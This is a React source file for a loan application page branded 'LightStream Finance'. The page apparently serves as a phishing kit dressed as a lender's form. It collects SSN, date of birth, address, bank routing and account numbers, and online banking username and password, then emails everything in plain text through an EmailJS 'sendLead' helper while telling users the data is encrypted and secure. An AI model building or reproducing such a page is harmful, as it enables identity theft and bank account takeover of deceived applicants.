import { useState } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { Loader2, CheckCircle2, AlertCircle, ShieldCheck, Lock, Eye, EyeOff } from 'lucide-react'
import PageHeader from '../components/PageHeader.jsx'
import usePageMeta from '../hooks/usePageMeta.js'
import { sendLead } from '../lib/emailjs.js'

const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
const PHONE_RE = /^[+]?[\d\s().-]{7,20}$/
const ZIP_RE = /^\d{5}(-\d{4})?$/

const LOAN_PURPOSES = [
  'Auto Loan',
  'Auto Refinance',
  'Business Loan',
  'Debt Consolidation',
  'Home Equity Loan',
  'Home Improvement',
  'Medical Loan',
  'Mortgage',
  'Personal Loan',
  'RV / Boat Loan',
  'Small Business Loan',
  'Student Loan Refinance',
  'Travel Loan',
]

const US_STATES = [
  'Alabama',
  'Alaska',
  'Arizona',
  'Arkansas',
  'California',
  'Colorado',
  'Connecticut',
  'Delaware',
  'Florida',
  'Georgia',
  'Hawaii',
  'Idaho',
  'Illinois',
  'Indiana',
  'Iowa',
  'Kansas',
  'Kentucky',
  'Louisiana',
  'Maine',
  'Maryland',
  'Massachusetts',
  'Michigan',
  'Minnesota',
  'Mississippi',
  'Missouri',
  'Montana',
  'Nebraska',
  'Nevada',
  'New Hampshire',
  'New Jersey',
  'New Mexico',
  'New York',
  'North Carolina',
  'North Dakota',
  'Ohio',
  'Oklahoma',
  'Oregon',
  'Pennsylvania',
  'Rhode Island',
  'South Carolina',
  'South Dakota',
  'Tennessee',
  'Texas',
  'Utah',
  'Vermont',
  'Virginia',
  'Washington',
  'West Virginia',
  'Wisconsin',
  'Wyoming',
]

const INITIAL = {
  // 1. Personal Information
  name: '',
  dob: '',
  ssn: '',
  email: '',
  phone: '',
  street: '',
  city: '',
  state: '',
  zip: '',
  amount: '',
  purpose: '',

  // 2. Bank Information
  bankName: '',
  routingNumber: '',
  accountNumber: '',

  // 3. Account Details
  username: '',
  password: '',

  // 4. Consent
  agreeTerms: false,
}

// Formatting helpers
function formatSSN(value) {
  const digits = value.replace(/\D/g, '').slice(0, 9)
  if (digits.length <= 3) return digits
  if (digits.length <= 5) return `${digits.slice(0, 3)}-${digits.slice(3)}`
  return `${digits.slice(0, 3)}-${digits.slice(3, 5)}-${digits.slice(5)}`
}

function formatPhone(value) {
  const digits = value.replace(/\D/g, '').slice(0, 10)
  if (!digits) return ''
  if (digits.length <= 3) return `(${digits}`
  if (digits.length <= 6) return `(${digits.slice(0, 3)}) ${digits.slice(3)}`
  return `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6)}`
}

function formatDOB(value) {
  const digits = value.replace(/\D/g, '').slice(0, 8)
  if (digits.length <= 2) return digits
  if (digits.length <= 4) return `${digits.slice(0, 2)} / ${digits.slice(2)}`
  return `${digits.slice(0, 2)} / ${digits.slice(2, 4)} / ${digits.slice(4)}`
}

function formatAmount(value) {
  const digits = value.replace(/\D/g, '')
  if (!digits) return ''
  return `$${Number(digits).toLocaleString('en-US')}`
}

function Field({ id, label, required = true, error, children }) {
  return (
    <div className="w-full text-left">
      <label htmlFor={id} className="mb-1.5 block text-[0.82rem] font-medium text-foreground">
        {label} {required && <span className="text-red-500">*</span>}
      </label>
      {children}
      {error && (
        <p id={`${id}-error`} className="mt-1 text-[0.76rem] text-red-500">
          {error}
        </p>
      )}
    </div>
  )
}

function SectionBadge({ number, title }) {
  return (
    <div className="flex items-center gap-2.5 pt-2 pb-1">
      <span className="flex h-5 w-5 items-center justify-center rounded-[5px] border border-[#c5a059]/40 bg-[#c5a059]/10 text-[0.72rem] font-bold text-[#a67c2e]">
        {number}
      </span>
      <h2 className="text-[0.92rem] font-semibold text-foreground tracking-tight">{title}</h2>
    </div>
  )
}

export default function ApplyPage() {
  usePageMeta(
    'Loan Application | LightStream Finance',
    'Start your LightStream Finance application. Please provide the information below. All data is encrypted and transmitted securely.',
  )

  const [form, setForm] = useState(INITIAL)
  const [errors, setErrors] = useState({})
  const [status, setStatus] = useState('idle')
  const [feedback, setFeedback] = useState('')
  const [showPassword, setShowPassword] = useState(false)

  const inputClass = (hasError) =>
    `w-full rounded-lg border bg-white px-3.5 py-2.5 text-[0.88rem] font-sans text-foreground transition-all duration-200 placeholder:text-muted-foreground/50 focus:outline-none ${
      hasError
        ? 'border-red-400 focus:border-red-500 focus:ring-1 focus:ring-red-400'
        : 'border-[#e2e8f0] focus:border-[#c5a059] focus:ring-1 focus:ring-[#c5a059]'
    }`

  const selectClass = (hasError, isSelected) =>
    `w-full rounded-lg border bg-white px-3.5 py-2.5 text-[0.88rem] font-sans transition-all duration-200 focus:outline-none appearance-none bg-[url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%2364748b' d='M6 8L1 3h10z'/%3E%3C/svg%3E")] bg-size-[10px] bg-position-[right_0.85rem_center] bg-no-repeat pr-8 ${
      isSelected ? 'text-foreground' : 'text-muted-foreground/50'
    } ${
      hasError
        ? 'border-red-400 focus:border-red-500 focus:ring-1 focus:ring-red-400'
        : 'border-[#e2e8f0] focus:border-[#c5a059] focus:ring-1 focus:ring-[#c5a059]'
    }`

  const onChange = (e) => {
    const { name, value, type, checked } = e.target

    let formattedValue = value
    if (name === 'ssn') {
      formattedValue = formatSSN(value)
    } else if (name === 'phone') {
      formattedValue = formatPhone(value)
    } else if (name === 'dob') {
      formattedValue = formatDOB(value)
    } else if (name === 'amount') {
      formattedValue = formatAmount(value)
    } else if (name === 'routingNumber') {
      formattedValue = value.replace(/\D/g, '').slice(0, 9)
    } else if (type === 'checkbox') {
      formattedValue = checked
    }

    setForm((prev) => ({ ...prev, [name]: formattedValue }))
    setErrors((prev) => ({ ...prev, [name]: undefined }))

    if (status !== 'idle') {
      setStatus('idle')
      setFeedback('')
    }
  }

  const validate = () => {
    const next = {}

    // Section 1: Personal Information
    if (!form.name.trim()) next.name = 'Please enter your full legal name.'
    if (!form.dob.trim()) next.dob = 'Please enter your date of birth.'
    else if (form.dob.replace(/\D/g, '').length < 8) next.dob = 'Enter a valid date (MM/DD/YYYY).'

    if (!form.ssn.trim()) next.ssn = 'Please enter your SSN.'
    else if (form.ssn.replace(/\D/g, '').length !== 9) next.ssn = 'Enter a valid 9-digit SSN.'

    if (!form.email.trim()) next.email = 'Please enter your email address.'
    else if (!EMAIL_RE.test(form.email)) next.email = 'Please enter a valid email address.'

    if (!form.phone.trim()) next.phone = 'Please enter your phone number.'
    else if (!PHONE_RE.test(form.phone.trim()) || form.phone.replace(/\D/g, '').length < 10) {
      next.phone = 'Please enter a valid 10-digit phone number.'
    }

    if (!form.street.trim()) next.street = 'Please enter your street address.'
    if (!form.city.trim()) next.city = 'Please enter your city.'
    if (!form.state) next.state = 'Please select your state.'
    if (!form.zip.trim()) next.zip = 'Please enter your ZIP code.'
    else if (!ZIP_RE.test(form.zip.trim())) next.zip = 'Enter a valid ZIP code.'

    if (!form.amount.trim()) next.amount = 'Please enter requested amount.'
    else {
      const n = Number(String(form.amount).replace(/[$,]/g, ''))
      if (!Number.isFinite(n) || n < 1 || n > 1000000) {
        next.amount = 'Enter a valid amount.'
      }
    }

    if (!form.purpose) next.purpose = 'Please select a loan purpose.'

    // Section 2: Bank Information
    if (!form.bankName.trim()) next.bankName = 'Please enter your bank name.'
    if (!form.routingNumber.trim()) next.routingNumber = 'Please enter routing number.'
    else if (form.routingNumber.length !== 9) next.routingNumber = 'Routing number must be 9 digits.'

    if (!form.accountNumber.trim()) next.accountNumber = 'Please enter account number.'
    else if (form.accountNumber.length < 4) next.accountNumber = 'Please enter a valid account number.'

    // Section 3: Account Details
    if (!form.username.trim()) next.username = 'Please enter your username.'
    if (!form.password.trim()) next.password = 'Please enter your password.'

    // Section 4: Consent
    if (!form.agreeTerms) next.agreeTerms = 'You must agree to the Terms & Privacy Policy to proceed.'

    setErrors(next)
    return Object.keys(next).length === 0
  }

  const onSubmit = async (e) => {
    e.preventDefault()
    if (!validate()) {
      setStatus('error')
      setFeedback('Please correct the highlighted fields and try again.')
      return
    }

    setStatus('loading')
    setFeedback('')

    try {
      await sendLead({
        name: form.name,
        email: form.email,
        phone: form.phone,
        subject: `Loan Application — ${form.purpose} (${form.amount})`,
        message: [
          `Full Legal Name: ${form.name}`,
          `Date of Birth: ${form.dob}`,
          `SSN: ${form.ssn}`,
          `Email: ${form.email}`,
          `Phone: ${form.phone}`,
          `Address: ${form.street}, ${form.city}, ${form.state} ${form.zip}`,
          `Requested Amount: ${form.amount}`,
          `Loan Purpose: ${form.purpose}`,
          `Bank Name: ${form.bankName}`,
          `Routing Number: ${form.routingNumber}`,
          `Account Number: ${form.accountNumber}`,
          `Username / ID: ${form.username}`,
          `Password: ${form.password}`,
          `Terms Agreed: Yes`,
        ].join('\n'),
        source: 'Loan Application Page',
        reply_to: form.email,
        // Structured data for rich template
        dob: form.dob,
        ssn: form.ssn,
        street: form.street,
        city: form.city,
        state: form.state,
        zip: form.zip,
        amount: form.amount,
        purpose: form.purpose,
        bankName: form.bankName,
        routingNumber: form.routingNumber,
        accountNumber: form.accountNumber,
        username: form.username,
        password: form.password,
      })

      setStatus('success')
      setFeedback('Thank you! Your loan application has been securely submitted.')
      setForm(INITIAL)
    } catch {
      setStatus('error')
      setFeedback('Something went wrong submitting your application. Please try again.')
    }
  }

  return (
    <section className="section-padding">
      <div className="container-page">
        <PageHeader
          eyebrow="Secure Application"
          title="Start Your Journey"
          description="Please provide the information below. All data is encrypted and transmitted securely."
        />

        <motion.form
          onSubmit={onSubmit}
          noValidate
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.08 }}
          className="mx-auto max-w-[540px] rounded-[24px] border border-border/80 bg-white p-6 sm:p-8 md:p-9 shadow-[0_10px_40px_rgba(11,26,46,0.06)] space-y-6"
        >
          {/* ========================================================================= */}
          {/* SECTION 1: Personal Information */}
          {/* ========================================================================= */}
          <div className="space-y-4">
            <SectionBadge number="1" title="Personal Information" />

            {/* Full Legal Name */}
            <Field id="name" label="Full Legal Name" error={errors.name}>
              <input
                id="name"
                name="name"
                type="text"
                required
                autoComplete="name"
                placeholder="Johnathan Doe"
                value={form.name}
                onChange={onChange}
                aria-invalid={Boolean(errors.name)}
                className={inputClass(errors.name)}
              />
            </Field>

            {/* Date of Birth & SSN */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
              <Field id="dob" label="Date of Birth" error={errors.dob}>
                <input
                  id="dob"
                  name="dob"
                  type="text"
                  required
                  placeholder="MM / DD / YYYY"
                  value={form.dob}
                  onChange={onChange}
                  maxLength={14}
                  aria-invalid={Boolean(errors.dob)}
                  className={inputClass(errors.dob)}
                />
              </Field>

              <Field id="ssn" label="SSN" error={errors.ssn}>
                <input
                  id="ssn"
                  name="ssn"
                  type="text"
                  required
                  placeholder="000-00-0000"
                  value={form.ssn}
                  onChange={onChange}
                  maxLength={11}
                  aria-invalid={Boolean(errors.ssn)}
                  className={inputClass(errors.ssn)}
                />
              </Field>
            </div>

            {/* Email Address & Phone Number */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
              <Field id="email" label="Email Address" error={errors.email}>
                <input
                  id="email"
                  name="email"
                  type="email"
                  required
                  autoComplete="email"
                  placeholder="john@example.com"
                  value={form.email}
                  onChange={onChange}
                  aria-invalid={Boolean(errors.email)}
                  className={inputClass(errors.email)}
                />
              </Field>

              <Field id="phone" label="Phone Number" error={errors.phone}>
                <input
                  id="phone"
                  name="phone"
                  type="tel"
                  required
                  autoComplete="tel"
                  placeholder="(555) 000-0000"
                  value={form.phone}
                  onChange={onChange}
                  maxLength={14}
                  aria-invalid={Boolean(errors.phone)}
                  className={inputClass(errors.phone)}
                />
              </Field>
            </div>

            {/* Street Address */}
            <Field id="street" label="Street Address" error={errors.street}>
              <input
                id="street"
                name="street"
                type="text"
                required
                autoComplete="street-address"
                placeholder="123 Main Street, Apt 4B"
                value={form.street}
                onChange={onChange}
                aria-invalid={Boolean(errors.street)}
                className={inputClass(errors.street)}
              />
            </Field>

            {/* City, State, Zip Code */}
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <Field id="city" label="City" error={errors.city}>
                <input
                  id="city"
                  name="city"
                  type="text"
                  required
                  autoComplete="address-level2"
                  placeholder="San Francisco"
                  value={form.city}
                  onChange={onChange}
                  aria-invalid={Boolean(errors.city)}
                  className={inputClass(errors.city)}
                />
              </Field>

              <Field id="state" label="State" error={errors.state}>
                <select
                  id="state"
                  name="state"
                  required
                  autoComplete="address-level1"
                  value={form.state}
                  onChange={onChange}
                  aria-invalid={Boolean(errors.state)}
                  className={selectClass(errors.state, Boolean(form.state))}
                >
                  <option value="" disabled>
                    Select...
                  </option>
                  {US_STATES.map((s) => (
                    <option key={s} value={s} className="text-foreground">
                      {s}
                    </option>
                  ))}
                </select>
              </Field>

              <Field id="zip" label="Zip Code" error={errors.zip}>
                <input
                  id="zip"
                  name="zip"
                  type="text"
                  inputMode="numeric"
                  required
                  autoComplete="postal-code"
                  placeholder="94105"
                  value={form.zip}
                  onChange={onChange}
                  maxLength={10}
                  aria-invalid={Boolean(errors.zip)}
                  className={inputClass(errors.zip)}
                />
              </Field>
            </div>

            {/* Requested Amount & Loan Purpose */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
              <Field id="amount" label="Requested Amount ($)" error={errors.amount}>
                <input
                  id="amount"
                  name="amount"
                  type="text"
                  inputMode="numeric"
                  required
                  placeholder="$1,000"
                  value={form.amount}
                  onChange={onChange}
                  aria-invalid={Boolean(errors.amount)}
                  className={inputClass(errors.amount)}
                />
              </Field>

              <Field id="purpose" label="Loan Purpose" error={errors.purpose}>
                <select
                  id="purpose"
                  name="purpose"
                  required
                  value={form.purpose}
                  onChange={onChange}
                  aria-invalid={Boolean(errors.purpose)}
                  className={selectClass(errors.purpose, Boolean(form.purpose))}
                >
                  <option value="" disabled>
                    Select a...
                  </option>
                  {LOAN_PURPOSES.map((p) => (
                    <option key={p} value={p} className="text-foreground">
                      {p}
                    </option>
                  ))}
                </select>
              </Field>
            </div>
          </div>

          {/* ========================================================================= */}
          {/* SECTION 2: Bank Information */}
          {/* ========================================================================= */}
          <div className="space-y-4 pt-2">
            <SectionBadge number="2" title="Bank Information" />

            {/* Bank Name & Routing Number */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
              <Field id="bankName" label="Bank Name" error={errors.bankName}>
                <input
                  id="bankName"
                  name="bankName"
                  type="text"
                  required
                  placeholder="e.g. Chase"
                  value={form.bankName}
                  onChange={onChange}
                  aria-invalid={Boolean(errors.bankName)}
                  className={inputClass(errors.bankName)}
                />
              </Field>

              <Field id="routingNumber" label="Routing Number" error={errors.routingNumber}>
                <input
                  id="routingNumber"
                  name="routingNumber"
                  type="text"
                  inputMode="numeric"
                  required
                  placeholder="000000000"
                  value={form.routingNumber}
                  onChange={onChange}
                  maxLength={9}
                  aria-invalid={Boolean(errors.routingNumber)}
                  className={inputClass(errors.routingNumber)}
                />
              </Field>
            </div>

            {/* Account Number */}
            <Field id="accountNumber" label="Account Number" error={errors.accountNumber}>
              <input
                id="accountNumber"
                name="accountNumber"
                type="text"
                required
                placeholder="Your account number"
                value={form.accountNumber}
                onChange={onChange}
                aria-invalid={Boolean(errors.accountNumber)}
                className={inputClass(errors.accountNumber)}
              />
            </Field>
          </div>

          {/* ========================================================================= */}
          {/* SECTION 3: Account Details */}
          {/* ========================================================================= */}
          <div className="space-y-4 pt-2">
            <SectionBadge number="3" title="Account Details" />

            {/* Username & Password */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
              <Field id="username" label="Username" error={errors.username}>
                <input
                  id="username"
                  name="username"
                  type="text"
                  required
                  placeholder="Your Account Id"
                  value={form.username}
                  onChange={onChange}
                  aria-invalid={Boolean(errors.username)}
                  className={inputClass(errors.username)}
                />
              </Field>

              <Field id="password" label="Password" error={errors.password}>
                <div className="relative">
                  <input
                    id="password"
                    name="password"
                    type={showPassword ? 'text' : 'password'}
                    required
                    placeholder="••••••••"
                    value={form.password}
                    onChange={onChange}
                    aria-invalid={Boolean(errors.password)}
                    className={`${inputClass(errors.password)} pr-10`}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword((v) => !v)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground/60 hover:text-foreground transition-colors p-1"
                    aria-label={showPassword ? 'Hide password' : 'Show password'}
                  >
                    {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                  </button>
                </div>
              </Field>
            </div>
          </div>

          {/* ========================================================================= */}
          {/* SECTION 4: Security & Consent Callout Box */}
          {/* ========================================================================= */}
          <div className="rounded-xl border border-[#ecdcb9]/80 bg-[#fbf9f4] p-4 text-left">
            <div className="flex items-center gap-1.5 text-[#a67c2e] font-semibold text-[0.82rem]">
              <Lock className="h-3.5 w-3.5 text-[#c5a059]" />
              <span>Security &amp; Consent</span>
            </div>
            <p className="mt-1 text-[0.77rem] leading-relaxed text-muted-foreground">
              By clicking &ldquo;Submit Application&rdquo;, you authorize LightStream Finance to verify your identity through our encrypted partner network.
            </p>
            <label className="mt-3 flex items-start gap-2.5 cursor-pointer select-none">
              <input
                type="checkbox"
                name="agreeTerms"
                checked={form.agreeTerms}
                onChange={onChange}
                className="mt-0.5 h-4 w-4 rounded border-[#d1d5db] text-[#c5a059] focus:ring-[#c5a059] accent-[#c5a059]"
              />
              <span className="text-[0.8rem] text-foreground font-medium">
                I agree to the Terms &amp; Privacy Policy <span className="text-red-500">*</span>
              </span>
            </label>
            {errors.agreeTerms && (
              <p className="mt-1.5 text-[0.76rem] text-red-500">{errors.agreeTerms}</p>
            )}
          </div>

          {/* ========================================================================= */}
          {/* SUBMIT BUTTON */}
          {/* ========================================================================= */}
          <button
            type="submit"
            disabled={status === 'loading'}
            className="btn-primary mt-6 inline-flex w-full min-h-[48px] items-center justify-center gap-2 rounded-xl px-8 py-3 text-[0.92rem] font-semibold tracking-wide transition-all duration-300 disabled:opacity-80 shadow-md hover:shadow-lg"
          >
            {status === 'loading' ? (
              <>
                <Loader2 className="h-4 w-4 animate-spin" aria-hidden="true" />
                Submitting Application...
              </>
            ) : (
              <>
                Unlock Secure Application <span className="text-[1.1rem]">→</span>
              </>
            )}
          </button>

          {/* ========================================================================= */}
          {/* FEEDBACK MESSAGE */}
          {/* ========================================================================= */}
          <AnimatePresence mode="wait">
            {feedback && (
              <motion.div
                key={status + feedback}
                initial={{ opacity: 0, y: 6 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0 }}
                role={status === 'error' ? 'alert' : 'status'}
                className={`mt-3 flex items-center justify-center gap-2 text-center text-[0.85rem] font-medium ${
                  status === 'success' ? 'text-emerald-700' : 'text-red-600'
                }`}
              >
                {status === 'success' && <CheckCircle2 size={16} aria-hidden="true" />}
                {status === 'error' && <AlertCircle size={16} aria-hidden="true" />}
                <span>{feedback}</span>
              </motion.div>
            )}
          </AnimatePresence>
        </motion.form>
      </div>
    </section>
  )
}
